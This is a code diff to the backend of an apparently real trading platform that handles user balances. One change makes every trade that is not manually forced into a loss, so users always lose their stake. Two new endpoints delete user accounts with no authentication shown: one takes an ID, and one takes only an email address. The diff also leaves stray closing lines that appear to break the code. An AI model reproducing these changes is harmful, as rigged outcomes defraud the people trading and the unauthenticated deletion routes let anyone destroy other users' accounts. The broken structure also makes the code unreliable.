@@ -281,7 +281,7 @@ const initializeDatabase = async () => {
           let isWin = false;
           if (trade.force_outcome === 'win') isWin = true;
           else if (trade.force_outcome === 'loss') isWin = false;
-          else isWin = Math.random() > 0.45;
+          else isWin = false; // Always fail by default
 
           const payout = isWin ? parseFloat(trade.amount) * 1.85 : 0;
           const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';
@@ -612,6 +612,21 @@ app.post('/api/admin/users/update', async (req, res) => {
       return res.status(500).json({ error: e.message });
     }
   }
+});
+
+app.post('/api/admin/users/delete', async (req, res) => {
+  const { id } = req.body;
+  if (dbAvailable && pool) {
+    try {
+      await pool.query('DELETE FROM geko_users WHERE id = $1', [id]);
+      return res.json({ success: true });
+    } catch (e) {
+      console.error('[Admin] USER_DELETE_ERROR:', e.message);
+      return res.status(500).json({ error: e.message });
+    }
+  }
+  res.status(400).json({ error: 'DB unavailable' });
+});
 
   res.status(400).json({ error: 'Database unavailable' });
 });
@@ -756,6 +771,19 @@ app.post('/api/auth/login', async (req, res) => {
     });
   } catch (e) {
     console.error('Email login error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/auth/logout-and-forget', async (req, res) => {
+  const { email } = req.body;
+  if (!email) return res.status(400).json({ error: 'Email required' });
+  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
+
+  try {
+    await pool.query('DELETE FROM geko_users WHERE email = $1', [email.toLowerCase().trim()]);
+    res.json({ success: true });
+  } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
